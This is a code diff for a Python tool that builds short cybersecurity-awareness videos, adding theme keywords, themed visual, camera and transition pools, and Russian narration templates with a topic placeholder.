@@ -149,7 +149,11 @@ _VALID = {
                "qr_panel", "qr_scan", "token_panel", "chain", "attack_grid",
                "server_rack", "server_corridor", "cables", "switch_macro",
                "keyboard", "bokeh", "eye", "face_glow", "person", "consequence",
-               "flash", "pause_black", "question", "final_q", "final_brand"},
+               "flash", "pause_black", "question", "final_q", "final_brand",
+               # M23: тематические художники
+               "lock_shield", "wallet_crypto", "cloud_data", "mobile_notif",
+               "email_phish", "code_terminal", "net_graph", "cam_surveillance",
+               "firewall_wall", "ai_brain"},
     "camera": {"push_in", "push_out", "drift", "shake", "static",
                "snap", "tilt", "whip_pan"},
     "trans_out": {"hard_cut", "whip", "zoom", "glitch", "dip", "match",
@@ -158,6 +162,316 @@ _VALID = {
              "silence", "none"},
     "mode": {"pop", "tracking", "reveal", "rise", "whisper", "sub"},
 }
+
+# ---------- тематический анализ (M23: контекст-зависимый монтаж) ----------
+
+_THEME_KW = {
+    "social":   ("взлом", "аккаунт", "соцсет", "профил", "авториз", "пароль",
+                  "соцсет", "мессенджер", "telegram", "whatsapp", "instagram",
+                  "facebook", "tiktok", "поддельн", "фишинг", "phishing",
+                  "social", "account", "profile", "login", "password", "message",
+                  "chat", "identity", "catfish", "scam", "fake"),
+    "infra":    ("сервер", "датацентр", "сеть", "инфраструктур", "облачн",
+                  "хостинг", "dns", "router", "switch", "firewall", "ixaas",
+                  "cloud", "datacenter", "network", "internet", "server",
+                  "hosting", "data", "cdn", "endpoint", "proxy", "ssl", "tls"),
+    "data":     ("данные", "утечк", "база", " персональ", "gdpr", "pii",
+                  "credentials", "dump", "leak", "database", "exfiltr",
+                  "конфиденци", "информац", "data", "breach", "exposure",
+                  "privacy", "record", "sensitive", "classified"),
+    "finance":  ("банк", "платёж", "транзакц", "крипто", "майнинг", "кошелёк",
+                  "wallet", "crypto", "bitcoin", "blockchain", "financ",
+                  "denьги", "средства", "перевод", "carding", "bank",
+                  "payment", "transaction", "money", "theft", "fraud", "atm"),
+    "malware":  ("вирус", "троян", "шифр", "ransom", "malware", "payload",
+                  "exploit", "backdoor", "ботнет", "botnet", "maware",
+                  "логику", "редирект", "инъекци", "sql", "xss", "rce",
+                  "virus", "trojan", "worm", "spyware", "rootkit",
+                  "encrypt", "decrypt", "infected", "compromised"),
+    "privacy":  ("шпион", "наблюд", "трекинг", "geolocation", "прослуш",
+                  "cam", "surveillance", "spyware", "stalkerware", "隐私",
+                  "приват", "конфиденц", "face", "biometr", "камера",
+                  "tracking", "monitor", "watch", "spy", "listen", "trace",
+                  "location", "gps", "webcam", "microphone"),
+}
+
+_THEME_PAINTERS = {
+    "social":   ["phone_dark", "phone_message", "phone_call", "person",
+                  "face_glow", "eye", "login_screen", "flash"],
+    "infra":    ["server_rack", "server_corridor", "switch_macro", "cables",
+                  "net_graph", "cloud_data", "bokeh", "flash"],
+    "data":     ["consequence", "cloud_data", "lock_shield", "firewall_wall",
+                  "chain", "eye", "keyboard", "flash"],
+    "finance":  ["wallet_crypto", "lock_shield", "keyboard", "phone_dark",
+                  "qr_scan", "consequence", "eye", "flash"],
+    "malware":  ["code_terminal", "keyboard", "chain", "attack_grid",
+                  "server_corridor", "consequence", "flash", "eye"],
+    "privacy":  ["cam_surveillance", "eye", "person", "phone_dark",
+                  "face_glow", "mobile_notif", "lock_shield", "flash"],
+}
+
+_THEME_CAMERAS = {
+    "social":   ["push_in", "drift", "shake", "snap"],
+    "infra":    ["push_in", "push_out", "snap", "static"],
+    "data":     ["push_in", "drift", "whip_pan", "shake"],
+    "finance":  ["push_in", "snap", "drift", "tilt"],
+    "malware":  ["shake", "snap", "push_in", "whip_pan"],
+    "privacy":  ["push_in", "drift", "shake", "static"],
+}
+
+_THEME_TRANS = {
+    "social":   ["whip", "hard_cut", "dip", "glitch"],
+    "infra":    ["hard_cut", "match", "zoom", "whip"],
+    "data":     ["hard_cut", "glitch", "whip", "dip"],
+    "finance":  ["hard_cut", "whip", "zoom", "dip"],
+    "malware":  ["glitch", "hard_cut", "whip", "speed_ramp"],
+    "privacy":  ["dip", "hard_cut", "whip", "glitch"],
+}
+
+# Озвучка по темам (M23): плоские dict с {TOPIC} placeholder.
+# Подстановка — .replace('{TOPIC}', short) при вызове template_shots (мгновенно).
+_NARR_GENERIC = {
+    "hook": [
+        ("Вас уже могут взламывать. {TOPIC}. Прямо сейчас.", "ВЗЛОМ УЖЕ ИДЁТ"),
+        ("Пока вы это читаете, {TOPIC} под угрозой.", "УГРОЗА УЖЕ ЗДЕСЬ"),
+        ("Каждый день {TOPIC} теряет тысячи пользователей.", "ТЫСЯЧИ ПОТЕРЬ"),
+        ("Кибератаки стали нормой. {TOPIC} — цель.", "НОРМАЛЬНАЯ ЦЕЛЬ"),
+        ("Ничего не заметили? {TOPIC} уже под контролем.", "УЖЕ ПОД КОНТРОЛЕМ"),
+        ("Среднее время взлома — четыре минуты. {TOPIC}.", "4 МИНУТЫ ДО ВЗЛОМА"),
+        ("{TOPIC}. Это не теория — это происходит сейчас.", "СЕЙЧАС"),
+        ("Забудьте про антивирус. {TOPIC} уже в опасности.", "АНТИВИРУС НЕ ПОМОЖЕТ"),
+        ("Новые угрозы. Новые жертвы. {TOPIC} — следующий?", "СЛЕДУЮЩАЯ ЦЕЛЬ"),
+        ("Каждый день — новая атака. {TOPIC} не исключение.", "НЕ ИСКЛЮЧЕНИЕ"),
+    ],
+    "problem": [
+        ("Вам приходит самое обычное сообщение.", "Обычное сообщение"),
+        ("Звонок с незнакомого номера.", "Незнакомый номер"),
+        ("Знакомая страница входа. Почти.", "Почти знакомый вход"),
+        ("Одно нажатие — и вы внутри ловушки.", "Одно нажатие"),
+        ("Письмо от банка. Почти настоящее.", "Почти настоящее"),
+        ("Ссылка в мессенджере от друга.", "Ссылка от друга"),
+        ("Обновление системы. Срочное. Настоящее?", "Срочное обновление"),
+        ("QR-код на парковке. Бесплатный Wi-Fi.", "Бесплатный Wi-Fi"),
+        ("Файл в письме. Important.docx.exe.", "Поддельный файл"),
+        ("Сообщение в Telegram: «Это ты?»", "Это ты?"),
+        ("Реклама в соцсети. Слишком выгодное предложение.", "Выгодное предложение"),
+        ("Знакомый логотип. Почти правильный URL.", "Почти правильный URL"),
+    ],
+    "escalation": [
+        ("Ссылка. Клик. Вход. Токен.", "Цепочка атаки"),
+        ("Так угоняют доступ за пару минут.", "Доступ за минуты"),
+        ("Серверы уже видят чужого.", "Чужой в сети"),
+        ("Пароль утек. Сессия скомпрометирована.", "Пароль утек"),
+        ("Двухфакторка? Обходим. Через тебя же.", "Обходим 2FA"),
+        ("Токен сессии — и админ доступ ваш.", "Токен = доступ"),
+        ("Cookies подменены. Браузер доверяет.", "Браузер доверяет"),
+        ("DNS-спуфинг. Вы на чужом сервере.", "Чужой сервер"),
+        ("Сертификат поддельный. Замок не спасает.", "Поддельный замок"),
+        ("Через SMS-пароль. Прямиком к аккаунту.", "Через SMS"),
+    ],
+    "peak": [
+        ("Фишинг. Подмена. Украденная сессия.", "Сессия украдена"),
+        ("Звонки, коды, поддельные экраны.", "Атака со всех сторон"),
+        ("Устройство уже скомпрометировано.", "Устройство скомпрометировано"),
+        ("Вся сеть видит ваш пароль.", "Пароль на виду"),
+        ("Данные утекают. Терабайтами.", "Терабайты утечек"),
+        ("Крипто-майнер в фоне. Сервер горит.", "Сервер горит"),
+        ("Бэкдор открыт. И закрыть его нечем.", "Бэкдор открыт"),
+        ("Рейнсомшифр. Ваши файлы — заложники.", "Файлы — заложники"),
+        ("Компания молчит. Утечка — миллионы.", "Молчание = миллионы"),
+        ("Права root у злоумышленника.", "Root доступ"),
+    ],
+    "twist": [
+        ("Но самое страшное — дальше.", "Самое страшное"),
+        ("Тихо. Слушайте.", "Пауза"),
+        ("Дверь злоумышленникам открываете вы сами.", "Вы сами"),
+        ("Замок есть. Но ключ — у них.", "Ключ у них"),
+        ("Вы думаете, это не про вас?", "Не про вас?"),
+        ("Спойлер: это про всех.", "Про всех"),
+        ("Каждый считает, что его не тронут.", "Не тронут?"),
+        ("Пока не тронут. Пока.", "Пока не тронут"),
+    ],
+    "accel": [
+        ("Одна ошибка превращается в один аккаунт.", "Одна ошибка"),
+        ("Одно устройство — и вся система.", "Вся система"),
+        ("Секунда — и пароль ваш.", "Секунда"),
+        ("Один клик — и доступ потерян.", "Один клик"),
+        ("Три секунды. Всё. Конец.", "Три секунды"),
+        ("Ноль уведомлений. Ноль шансов.", "Ноль шансов"),
+        ("Тихо. Без следов. Без возможности.", "Без следов"),
+        ("Файлы. Деньги. Репутация. Всё сразу.", "Всё сразу"),
+    ],
+    "climax": [
+        ("Темп растёт. Система тает на глазах.", "Система тает"),
+        ("Так кто кого защищает в истории: {TOPIC}?", "Кто кого защищает"),
+        ("Вы систему. Или система — вас?", "Вы или вас"),
+        ("ТрастНод. Кибербезопасность простыми словами.", "ТрастНод"),
+        ("Защита начинается с вас.", "Начните сейчас"),
+        ("Не ждите взлома. Действуйте.", "Действуйте"),
+        ("Кибербезопасность — это привычка.", "Привычка безопасности"),
+        ("Один шаг назад — и вы впереди.", "Один шаг"),
+        ("Ваша безопасность — ваш выбор.", "Ваш выбор"),
+        ("ТрастНод. Мы объясняем просто.", "ТрастНод"),
+    ],
+}
+
+# Тематические NARR — только то, что отличается от generic.
+# Социальная инженерия: реплики про обман, доверие, людей.
+_NARR_SOCIAL = {
+    "hook": [
+        ("{TOPIC}. Вас обманывают. Каждый день.", "ОБМАН КАЖДЫЙ ДЕНЬ"),
+        ("Злоумышленники знают ваше имя. {TOPIC}.", "ЗНАЮТ ВАШЕ ИМЯ"),
+        ("{TOPIC} — идеальная цель для соцсетного инженера.", "ЦЕЛЬ ИНЖЕНЕРА"),
+        ("Доверие — ваша главная уязвимость. {TOPIC}.", "ДОВЕРИЕ = УЯЗВИМОСТЬ"),
+        ("Кто-то уже читает ваши сообщения. {TOPIC}.", "ЧИТАЮТ ВАШИ СООБЩЕНИЯ"),
+        ("{TOPIC}. Поддельные аккаунты — новый стандарт.", "ПОДДЕЛЬНЫЕ АККАУНТЫ"),
+    ],
+    "problem": [
+        ("Сообщение от «друга». Почти настоящее.", "От «друга»"),
+        ("Звонок из банка. Голос настоящий. Номер — нет.", "Настоящий голос"),
+        ("Просьба срочно перевести деньги. «Срочно!».", "Срочный перевод"),
+        ("Фото в мессенджере. От знакомого. Почти.", "От знакомого"),
+        ("Письмо: «Ваш аккаунт заблокирован».", "Аккаунт заблокирован"),
+        ("Профиль в соцсети. Все фото. Все друзья. Подделка.", "Всё как надо"),
+    ],
+}
+
+# Инфраструктура: серверы, сети, облака.
+_NARR_INFRA = {
+    "hook": [
+        ("{TOPIC}. Серверы горят. Данные утекают.", "СЕРВЕРЫ ГОРЯТ"),
+        ("Один сервер — и тысячи компаний. {TOPIC}.", "ТЫСЯЧИ КОМПАНИЙ"),
+        ("{TOPIC} — точка отказа для всей инфраструктуры.", "ТОЧКА ОТКАЗА"),
+        ("Облачный провайдер под ударом. {TOPIC}.", "ОБЛАКО ПОД УДАРОМ"),
+        ("Инфраструктура рушится. {TOPIC} — эпицентр.", "ЭПИЦЕНТР"),
+        ("{TOPIC}. Если сервер падает — всё падает.", "ВСЁ ПАДАЕТ"),
+    ],
+    "problem": [
+        ("Обновление прошивки. Поддельное.", "Поддельная прошивка"),
+        ("Кабель в дата-центре. Обычный. Почти.", "Почти обычный"),
+        ("DNS-запрос. На чужой сервер.", "На чужой сервер"),
+        ("Сертификат валидный. Владелец — нет.", "Валидный сертификат"),
+        ("Роутер перезагрузился. Сам.", "Сам перезагрузился"),
+        ("Логин в панель админа. Настоящий? Нет.", "Настоящий логин"),
+    ],
+}
+
+# Финансы: деньги, крипто, транзакции.
+_NARR_FINANCE = {
+    "hook": [
+        ("{TOPIC}. Деньги утекают. Тихо.", "ДЕНЬГИ УТЕКАЮТ"),
+        ("Крипто-кошелёк пуст. {TOPIC}.", "КОШЕЛЁК ПУСТ"),
+        ("{TOPIC} — финансовая катастрофа за минуты.", "ФИНАНСОВАЯ КАТАСТРОФА"),
+        ("Миллионы исчезли. {TOPIC}. Молча.", "МИЛЛИОНЫ ИСЧЕЗЛИ"),
+        ("Банковский аккаунт взломан. {TOPIC}.", "ВЗЛОМ БАНКА"),
+        ("{TOPIC}. Финансовая безопасность — иллюзия.", "ИЛЛЮЗИЯ БЕЗОПАСНОСТИ"),
+    ],
+    "problem": [
+        ("Письмо из банка. Почти настоящее.", "Почти из банка"),
+        ("QR-код для оплаты. Поддельный.", "Поддельный QR"),
+        ("Ссылка на «личный кабинет». Чужая.", "Чужая ссылка"),
+        ("Звонок: «Ваш перевод задержан».", "Задержан перевод"),
+        ("Токен для крипто-кошелька. Украден.", "Украден токен"),
+        ("SMS с кодом. От «банка». Не от банка.", "Не от банка"),
+    ],
+}
+
+# Вредоносное ПО: вирусы, шифровальщики, эксплойты.
+_NARR_MALWARE = {
+    "hook": [
+        ("{TOPIC}. Вирус уже внутри.", "ВИРУС УЖЕ ВНУТРИ"),
+        ("Шифровальщик активирован. {TOPIC}.", "ШИФРОВАЛЬЩИК АКТИВЕН"),
+        ("{TOPIC}. Ваш код скомпрометирован.", "КОД СКОМПРОМЕТИРОВАН"),
+        ("Бэкдор в системе. {TOPIC}.", "БЭКДОР ОТКРЫТ"),
+        ("{TOPIC}. Малварь маскируется под обновление.", "ПОДДЕЛЬНОЕ ОБНОВЛЕНИЕ"),
+        ("Каждый файл зашифрован. {TOPIC}.", "ФАЙЛЫ ЗАШИФРОВАНЫ"),
+    ],
+    "problem": [
+        ("Файл .exe. Настоящая иконка. Поддельный код.", "Поддельный код"),
+        ("Обновление системы. Срочное. Настоящее?", "Не настоящее"),
+        ("Скрипт на сайте. Запускается автоматически.", "Автозапуск"),
+        ("Письмо с вложением. Документ. Почти.", "Почти документ"),
+        ("Рекламный баннер. Внутри — эксплойт.", "Баннер с эксплойтом"),
+        ("Приложение из неофициального магазина.", "Неофициальное"),
+    ],
+}
+
+# Приватность: слежка, камеры, биометрия.
+_NARR_PRIVACY = {
+    "hook": [
+        ("{TOPIC}. Вас watching. Всегда.", "ВАС НАБЛЮДАЮТ"),
+        ("Камера в вашем кармане. {TOPIC}.", "КАМЕРА В КАРМАНЕ"),
+        ("{TOPIC} — приватность иллюзорна.", "ПРИВАТНОСТЬ ИЛЛЮЗИЯ"),
+        ("Каждое движение записано. {TOPIC}.", "ВСЁ ЗАПИСАНО"),
+        ("{TOPIC}. Ваш телефон — шпион.", "ТЕЛЕФОН — ШПИОН"),
+        ("Биометрия украдена. {TOPIC}.", "БИОМЕТРИЯ УКРАДЕНА"),
+    ],
+    "problem": [
+        ("Приложение просит доступ к камере. Зачем?", "Зачем камера?"),
+        ("Уведомление: «Вас ищут».", "Вас ищут"),
+        ("Координаты переданы. Точно. Минуту назад.", "Координаты переданы"),
+        ("Голосовой помощник слушает. Всегда.", "Слушает всегда"),
+        ("Камера безопасности. В вашем доме. Чужая.", "Чужая камера"),
+        ("QR-код. Сканируете. Он сканирует вас.", "Сканирует вас"),
+    ],
+}
+
+_THEME_NARR = {
+    "social":  _NARR_SOCIAL,
+    "infra":   _NARR_INFRA,
+    "finance": _NARR_FINANCE,
+    "malware": _NARR_MALWARE,
+    "privacy": _NARR_PRIVACY,
+}
+
+
+def extract_visual_theme(topic):
+    """M23: анализ темы → список подходящих тем (social/infra/data/finance/malware/privacy).
+    Возвращает список отсортированный по релевантности (первый = основной)."""
+    t = (topic or "").lower()
+    scores = {}
+    for theme, keywords in _THEME_KW.items():
+        s = sum(1 for kw in keywords if kw in t)
+        if s > 0:
+            scores[theme] = s
+    if not scores:
+        return []
+    return [th for th, _ in sorted(scores.items(), key=lambda x: -x[1])]
+
+
+def theme_painters(themes):
+    """M23: темы → пул визуалов (в порядке приоритета, без дублей)."""
+    seen, out = set(), []
+    for th in themes:
+        for p in _THEME_PAINTERS.get(th, []):
+            if p not in seen:
+                seen.add(p)
+                out.append(p)
+    return out or list(PURE_TYPO_VISUALS | {"bokeh", "phone_dark", "keyboard",
+                                            "server_rack", "eye"})
+
+
+def theme_cameras(themes):
+    """M23: темы → пул камер."""
+    seen, out = set(), []
+    for th in themes:
+        for c in _THEME_CAMERAS.get(th, []):
+            if c not in seen:
+                seen.add(c)
+                out.append(c)
+    return out or ["push_in", "drift", "shake", "snap", "static"]
+
+
+def theme_trans(themes):
+    """M23: темы → пул переходов."""
+    seen, out = set(), []
+    for th in themes:
+        for t_ in _THEME_TRANS.get(th, []):
+            if t_ not in seen:
+                seen.add(t_)
+                out.append(t_)
+    return out or ["hard_cut", "whip", "dip", "glitch", "zoom"]
+
 
 # Safe area: текст НИКОГДА не выходит за эти границы (доля кадра 1080x1920).
 SAFE_L = int(W * 0.09)          # 97 px слева/справа
@@ -292,14 +606,19 @@ def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic"):
     """Fallback-план: драматургия hook->problem->escalation->peak->twist->
     accel->climax, тексты и визуальный ряд собираются ПОД ТЕМУ topic.
 
-    Это не захардкоженный сценарий: topic подставляется в hook/проблему/
-    вопрос, архетипы кадров чередуются детерминированно от хэша темы.
+    M23: визуалы/камеры/переходы выбираются из тематических пулов.
+    Oзвучка из модульных dict с {TOPIC} placeholder (мгновенная подстановка).
     """
     topic = (topic or "Как вас взламывают").strip()
     short = topic[:48]
     rnd = random.Random(abs(hash(topic)) % (2 ** 32))
-    # окна актов масштабируются под реальную длину (база — ~42 сек плана)
     k = max(0.4, seconds / 42.0)
+
+    # M23: тематический анализ → выбор пулов
+    themes = extract_visual_theme(topic)
+    pv = theme_painters(themes)   # ordered list of visual names
+    cm = theme_cameras(themes)    # ordered list of camera names
+    tr = theme_trans(themes)      # ordered list of transition names
 
     def sc(act, dur, visual, camera, texts, trans_out, sfx="none",
            speed=(1.0, 1.0), accent="accent", fx="", typ=None,
@@ -315,153 +634,70 @@ def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic"):
                 "speed": speed, "accent": accent, "fx": fx, "type": typ}
 
     def tx(*lines, mode="pop"):
-        # короткие строки: максимум 24 символа (safe area следит за остальным)
         return [{"lines": [l.upper().strip()[:24] for l in lines], "mode": mode}]
 
-    hook_line = short.upper().strip()[:24]
-    peak_pool = ["attack_grid", "qr_scan", "token_panel", "server_corridor",
-                 "phone_call", "switch_macro", "face_glow", "login_screen"]
+    # M23: тематические визуалы для каждого акта (вместо хардкода)
+    # pv[0] = основной визуал темы, pv[1..] = запасные
+    _pv = pv  # shorthand
+    _cam = lambda i: cm[i % len(cm)]
+    _tr_ = lambda i: tr[i % len(tr)]
+
+    peak_pool = [_pv[i % len(_pv)] for i in range(8)]
     rnd.shuffle(peak_pool)
 
-    # Озвучка TikTok-стиля (M16): 10+ фраз на акт, без повторов в одном видео.
-    # Пары (voice — что говорит диктор, sub — субтитр по центру кадра).
-    # topic вплетён в hook/вопрос; реплики разнообразные, не шаблонные.
+    # M23: озвучка из модульных dict с {TOPIC} placeholder
+    # Берём тематический dict (если есть) или generic
+    primary_theme = themes[0] if themes else None
+    narr_raw = _THEME_NARR.get(primary_theme, _NARR_GENERIC)
+    # подстановка {TOPIC} → short (мгновенно, без f-string конструктора)
     NARR = {
-        "hook": [
-            (f"Вас уже могут взламывать. {short}. Прямо сейчас.",
-             "ВЗЛОМ УЖЕ ИДЁТ"),
-            (f"Пока вы это читаете, {short} под угрозой.",
-             "УГРОЗА УЖЕ ЗДЕСЬ"),
-            (f"Каждый день {short} теряет тысячи пользователей.",
-             "ТЫСЯЧИ ПОТЕРЬ"),
-            (f"Кибератаки стали нормой. {short} — цель.",
-             "НОРМАЛЬНАЯ ЦЕЛЬ"),
-            (f"Ничего не заметили? {short} уже под контролем.",
-             "УЖЕ ПОД КОНТРОЛЕМ"),
-            (f"Среднее время взлома — четыре минуты. {short}.",
-             "4 МИНУТЫ ДО ВЗЛОМА"),
-        ],
-        "problem": [
-            ("Вам приходит самое обычное сообщение.", "Обычное сообщение"),
-            ("Звонок с незнакомого номера.", "Незнакомый номер"),
-            ("Знакомая страница входа. Почти.", "Почти знакомый вход"),
-            ("Одно нажатие — и вы внутри ловушки.", "Одно нажатие"),
-            ("Письмо от банка. Почти настоящее.", "Почти настоящее"),
-            ("Ссылка в мессенджере от друга.", "Ссылка от друга"),
-            ("Обновление системы. Срочное. Настоящее?", "Срочное обновление"),
-            ("QR-код на парковке. Бесплатный Wi-Fi.", "Бесплатный Wi-Fi"),
-            ("Файл в письме. Important.docx.exe.", "Поддельный файл"),
-            ("Сообщение в Telegram: «Это ты?»", "Это ты?"),
-            ("Реклама в соцсети. Слишком выгодное предложение.", "Выгодное предложение"),
-            ("Знакомый логотип. Почти правильный URL.", "Почти правильный URL"),
-        ],
-        "escalation": [
-            ("Ссылка. Клик. Вход. Токен.", "Цепочка атаки"),
-            ("Так угоняют доступ за пару минут.", "Доступ за минуты"),
-            ("Серверы уже видят чужого.", "Чужой в сети"),
-            ("Пароль утек. Сессия скомпрометирована.", "Пароль утек"),
-            ("Двухфакторка? Обходим. Через тебя же.", "Обходим 2FA"),
-            ("Токен сессии — и админ доступ ваш.", "Токен = доступ"),
-            ("Cookies подменены. Браузер доверяет.", "Браузер доверяет"),
-            ("DNS-спуфинг. Вы на чужом сервере.", "Чужой сервер"),
-            ("Сертификат поддельный. Замок не спасает.", "Поддельный замок"),
-            ("Через SMS-пароль. Прямиком к аккаунту.", "Через SMS"),
-        ],
-        "peak": [
-            ("Фишинг. Подмена. Украденная сессия.", "Сессия украдена"),
-            ("Звонки, коды, поддельные экраны.", "Атака со всех сторон"),
-            ("Устройство уже скомпрометировано.", "Устройство скомпрометировано"),
-            ("Вся сеть видит ваш пароль.", "Пароль на виду"),
-            ("Данные утекают. Терабайтами.", "Терабайты утечек"),
-            ("Крипто-майнер в фоне. Сервер горит.", "Сервер горит"),
-            ("Бэкдор открыт. И закрыть его нечем.", "Бэкдор открыт"),
-            ("Рейнсомшифр. Ваши файлы — заложники.", "Файлы — заложники"),
-            ("Компания молчит. Утечка — миллионы.", "Молчание = миллионы"),
-            ("Права root у злоумышленника.", "Root доступ"),
-        ],
-        "twist": [
-            ("Но самое страшное — дальше.", "Самое страшное"),
-            ("Тихо. Слушайте.", "Пауза"),
-            ("Дверь злоумышленникам открываете вы сами.", "Вы сами"),
-            ("Замок есть. Но ключ — у них.", "Ключ у них"),
-            ("Вы думаете, это не про вас?", "Не про вас?"),
-            ("Спойлер: это про всех.", "Про всех"),
-            ("Каждый считает, что его не тронут.", "Не тронут?"),
-            ("Пока не тронут. Пока.", "Пока не тронут"),
-        ],
-        "accel": [
-            ("Одна ошибка превращается в один аккаунт.", "Одна ошибка"),
-            ("Одно устройство — и вся система.", "Вся система"),
-            ("Секунда — и пароль ваш.", "Секунда"),
-            ("Один клик — и доступ потерян.", "Один клик"),
-            ("Три секунды. Всё. Конец.", "Три секунды"),
-            ("Ноль уведомлений. Ноль шансов.", "Ноль шансов"),
-            ("Тихо. Без следов. Без возможности.", "Без следов"),
-            ("Файлы. Деньги. Репутация. Всё сразу.", "Всё сразу"),
-        ],
-        "climax": [
-            ("Темп растёт. Система тает на глазах.", "Система тает"),
-            (f"Так кто кого защищает в истории: {short}?", "Кто кого защищает"),
-            ("Вы систему. Или система — вас?", "Вы или вас"),
-            ("ТрастНод. Кибербезопасность простыми словами.", "ТрастНод"),
-            ("Защита начинается с вас.", "Начните сейчас"),
-            ("Не ждите взлома. Действуйте.", "Действуйте"),
-            ("Кибербезопасность — это привычка.", "Привычка безопасности"),
-            ("Один шаг назад — и вы впереди.", "Один шаг"),
-            ("Ваша безопасность — ваш выбор.", "Ваш выбор"),
-            ("ТрастНод. Мы объясняем просто.", "ТрастНод"),
-        ],
+        act: [(v.replace("{TOPIC}", short), s.replace("{TOPIC}", short))
+              for v, s in entries]
+        for act, entries in narr_raw.items()
     }
     _narr_i = {a: 0 for a in NARR}
-    _narr_used = {a: set() for a in NARR}  # M16: не повторять в одном видео
+    _narr_used = {a: set() for a in NARR}
 
-    # Принцип: CINEMATIC -> TEXT -> CINEMATIC -> TEXT ... Текст ПОДЧЁРКИВАЕТ
-    # видео (короткие ударные вставки 1-3 слова), а не заменяет его.
-    # Чисто текстовые фоны (flash/pause_black/final_q) — не более ~30%.
-    # M16: логичная группировка — каждый акт = своя визуальная логика.
+    # M23: контекст-зависимый шаблон — визуалы из тематического пула,
+    # а НЕ захардкоженные. Каждый акт = своя визуальная логика.
+    # Структура (тайминги/акты) детерминирована, визуал — из pv[].
     shots = [
-        # 0-3с: HOOK — максимально сильный удар, без логотипа
-        sc("hook", 2.8 * k, "phone_dark", "push_in",
-           tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), "hard_cut",
+        # 0-3с: HOOK — максимально сильный удар
+        sc("hook", 2.8 * k, _pv[0], _cam(0),
+           tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
            "impact", (0.7, 1.3), "accent2", typ="typography"),
-        # 3-10с: ПРОБЛЕМА — бытовые ситуации: сообщение, звонок, ссылка.
-        # Чередование: живой кадр → текст-вспышка → живой кадр → текст.
-        # Камера drift/push_in (вовлечение), текст pop (быстрый удар).
-        sc("problem", 2.0 * k, "phone_message", "drift", [], "whip",
+        # 3-10с: ПРОБЛЕМА — бытовые ситуации.
+        sc("problem", 2.0 * k, _pv[1 % len(_pv)], _cam(1), [], _tr_(1),
            "notify", (1.0, 1.2)),
         sc("problem", 0.9 * k, "flash", "static",
            tx("ОДНА ССЫЛКА", mode="pop"), "hard_cut", "click",
            typ="typography"),
-        sc("problem", 1.6 * k, "phone_call", "push_in", [], "match",
+        sc("problem", 1.6 * k, _pv[2 % len(_pv)], _cam(2), [], "match",
            "notify", (1.0, 1.1)),
         sc("problem", 0.7 * k, "flash", "static",
            tx("ОДИН ЗВОНОК", mode="pop"), "hard_cut", "click",
            typ="typography"),
-        sc("problem", 1.5 * k, "login_screen", "push_in", [], "zoom",
+        sc("problem", 1.5 * k, _pv[3 % len(_pv)], _cam(3), [], _tr_(2),
            "whoosh", (1.1, 1.3)),
         sc("problem", 0.7 * k, "flash", "static",
            tx("ОДИН КЛИК", mode="pop"), "hard_cut", "impact",
            typ="typography"),
-        sc("problem", 1.3 * k, "person", "drift", [], "whip", "notify",
-           (0.9, 1.1)),
-        # 10-20с: ЭСКАЛАЦИЯ — технические средства атаки по цепочке.
-        # keyboard → qr → token → server: нарастание масштаба.
-        # Камера push_in/snap (напряжение), текст — редкие вспышки.
-        sc("escalation", 1.4 * k, "keyboard", "push_in", [], "hard_cut",
+        sc("problem", 1.3 * k, _pv[4 % len(_pv)], _cam(4), [], _tr_(3),
+           "notify", (0.9, 1.1)),
+        # 10-20с: ЭСКАЛАЦИЯ — нарастание масштаба.
+        sc("escalation", 1.4 * k, "keyboard", _cam(5), [], "hard_cut",
            "click", (1.2, 1.6)),
-        sc("escalation", 0.8 * k, "qr_scan", "snap", [], "hard_cut",
+        sc("escalation", 0.8 * k, "qr_scan", _cam(6), [], "hard_cut",
            "whoosh", (1.5, 2.0)),
-        sc("escalation", 1.1 * k, "token_panel", "drift", [], "whip",
+        sc("escalation", 1.1 * k, _pv[5 % len(_pv)], _cam(0), [], _tr_(4),
            "notify"),
         sc("escalation", 0.7 * k, "flash", "static",
            tx("ДОСТУП", mode="pop"), "hard_cut", "bass", typ="typography"),
-        sc("escalation", 1.6 * k, "server_corridor", "push_in", [],
+        sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
            "match", "riser", (0.9, 1.5)),
-        sc("escalation", 0.9 * k, "cables", "snap", [], "hard_cut",
+        sc("escalation", 0.9 * k, "cables", _cam(2), [], "hard_cut",
            "click", (1.3, 1.7)),
         # 20-30с: ПИК ДИНАМИКИ — быстрые кадры 0.5-0.9с, красный accent2.
-        # Визуал: лицо,.GridView, замки, серверы — хаос атаки.
-        # Камера shake/snap (паника), glitch на ключевых моментах.
         sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
            "impact", (1.4, 1.4), "accent2", typ="graphic"),
         sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
@@ -478,36 +714,31 @@ def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic"):
         sc("peak", 0.9 * k, peak_pool[6], "push_in",
            tx("ДОСТУП РАЗРЕШЁН", mode="pop"), "dip", "bass", (1.2, 0.6),
            "accent2"),
-        # 30-35с: РЕЗКАЯ ПАУЗА — темп и звук падают. Только чёрный + eye.
-        # Камера static (стоп-кадр), текст reveal (медленно появляется).
+        # 30-35с: РЕЗКАЯ ПАУЗА — темп и звук падают.
         sc("twist", 1.6 * k, "pause_black", "static",
            tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
            (0.4, 0.4), typ="typography"),
         sc("twist", 1.2 * k, "pause_black", "static", [], "dip",
            "silence", (0.3, 0.3)),
-        sc("twist", 2.0 * k, "eye", "push_in",
+        sc("twist", 2.0 * k, "eye", _cam(3),
            tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
            "impact", (0.5, 1.8)),
-        # 35-50с: ФИНАЛЬНОЕ УСКОРЕНИЕ — масштаб растёт: ошибка→аккаунт→система.
-        # Визуал: consequence (нарастание), камера push_in→push_out (расширение).
-        # Один кадр keyboards как « корень ошибки».
-        sc("accel", 1.6 * k, "keyboard", "push_in",
+        # 35-50с: ФИНАЛЬНОЕ УСКОРЕНИЕ — масштаб растёт.
+        sc("accel", 1.6 * k, "keyboard", _cam(0),
            tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
-        sc("accel", 1.3 * k, "consequence", "push_in",
